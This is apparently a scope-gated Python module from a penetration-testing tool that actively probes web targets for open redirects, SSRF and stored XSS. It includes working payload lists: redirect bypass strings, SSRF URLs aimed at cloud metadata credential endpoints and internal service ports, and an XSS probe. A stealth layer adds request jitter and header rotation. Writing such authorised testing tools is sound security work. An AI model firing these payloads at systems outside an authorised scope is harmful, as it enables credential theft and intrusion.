"""SSRF, open redirect, and stored-XSS exploitation (active). Scope-gated.
Covers Shannon ✅ INPV-19 (SSRF), CLNT-04 (client-side URL redirect), INPV-02 (stored XSS).
"""
import time
import uuid
from urllib.parse import urlparse

import httpx

from .. import safehttp, stealth
from ..config import HTTP_TIMEOUT
from ..scope_guard import check

_OPEN_REDIRECT = [
    "https://example.org", "//example.org", "/\\example.org", "https:/example.org",
    "http://example.org%2f", "https://TARGET@example.org", "//example.org\\@TARGET",
    "https://example.org/..", "\\/\\/example.org",
]
# internal/metadata URLs injected as PARAMETER DATA (never fetched by Wraith itself).
_SSRF = [
    # cloud metadata (AWS/Azure/GCP) + internal services + common admin ports (Shannon set)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/", "http://127.0.0.1:22/", "http://127.0.0.1:8080/admin",
    "http://127.0.0.1:3306/", "http://127.0.0.1:5432/", "http://127.0.0.1:6379/",
    "http://localhost/admin", "http://[::1]/", "http://0.0.0.0/", "http://example.org/",
]


def _send(target, param, value, method, cookies, follow=False):
    stealth.jitter()
    if method.upper() == "GET":
        return safehttp.get(target, params={param: value}, timeout=HTTP_TIMEOUT,
                         follow_redirects=follow, headers=stealth.headers(), cookies=cookies or {})
    return safehttp.request(method.upper(), target, data={param: value}, timeout=HTTP_TIMEOUT,
                         follow_redirects=follow, headers=stealth.headers(), cookies=cookies or {})


def open_redirect(target: str, param: str, method: str = "GET", cookies: dict | None = None) -> dict:
    """Inject redirect payloads pointing at the canary host example.org; confirm when the
    server issues a 3xx Location to it."""
    check(target)
    hits = []
    for p in _OPEN_REDIRECT:
        try:
            r = _send(target, param, p, method, cookies, follow=False)
        except httpx.HTTPError:
            continue
        loc = r.headers.get("location", "")
        if 300 <= r.status_code < 400 and "example.org" in loc:
            hits.append({"payload": p, "status": r.status_code, "location": loc, "confirmed": True})
    return {"target": target, "param": param, "tested": len(_OPEN_REDIRECT),
            "findings": hits, "verdict": "VULNERABLE" if hits else "not-detected"}


def ssrf(target: str, param: str, method: str = "GET", cookies: dict | None = None,
              oast_host: str = "") -> dict:
    """Inject internal/metadata URLs into `param`. Blind SSRF is only *confirmed* with an
    out-of-band listener — pass oast_host (your collaborator) and watch it for the token.
    Without one, this reports timing/error/reflection heuristics (indicative, not proof)."""
    check(target)
    token = uuid.uuid4().hex[:10]
    canaries = list(_SSRF) + ([f"http://{oast_host}/{token}"] if oast_host else [])
    probes = []
    for u in canaries:
        t0 = time.monotonic()
        try:
            r = _send(target, param, u, method, cookies, follow=False)
        except httpx.ReadTimeout:
            probes.append({"canary": u, "signal": "timeout — server may have attempted the fetch"})
            continue
        except httpx.HTTPError as e:
            probes.append({"canary": u, "signal": f"error: {e}"})
            continue
        dt = time.monotonic() - t0
        body = r.text[:600].lower()
        sig = ""
        for kw in ("connection refused", "could not resolve", "timed out", "econnrefused",
                   "meta-data", "ami-id", "instance-id", "no route to host"):
            if kw in body:
                sig = f"response mentions '{kw}'"
                break
        if not sig and dt >= 4.0:
            sig = f"slow response {dt:.1f}s"
        probes.append({"canary": u, "status": r.status_code, "dt": round(dt, 2), "signal": sig or "no clear signal"})
    note = (f"OOB mode — check your listener at {oast_host} for token {token}"
            if oast_host else "heuristic only — pass oast_host for definitive blind-SSRF confirmation")
    return {"target": target, "param": param, "probes": probes, "note": note, "verdict": "review"}


def stored_xss(target: str, param: str, method: str = "POST", verify_url: str = "",
                    cookies: dict | None = None) -> dict:
    """Inject a unique XSS marker via `param`, then re-fetch (verify_url or target) and
    check whether it persisted UNescaped — i.e. stored XSS."""
    check(target)
    if verify_url:
        check(verify_url)
    marker = f"wsx{uuid.uuid4().hex[:8]}"
    probe = f"<svg/onload=alert({marker})>"
    try:
        _send(target, param, probe, method, cookies)
    except httpx.HTTPError as e:
        return {"error": f"inject failed: {e}"}
    url = verify_url or target
    stealth.jitter()
    try:
        r = safehttp.get(url, timeout=HTTP_TIMEOUT, follow_redirects=False,
                      headers=stealth.headers(), cookies=cookies or {})
    except httpx.HTTPError as e:
        return {"error": f"verify failed: {e}"}
    raw = probe in r.text
    enc = ("&lt;svg" in r.text and marker in r.text)
    return {"target": target, "verify_url": url, "param": param,
            "stored_unescaped": raw, "stored_encoded": enc,
            "verdict": "VULNERABLE" if raw else ("stored-but-escaped" if enc else "not-detected")}
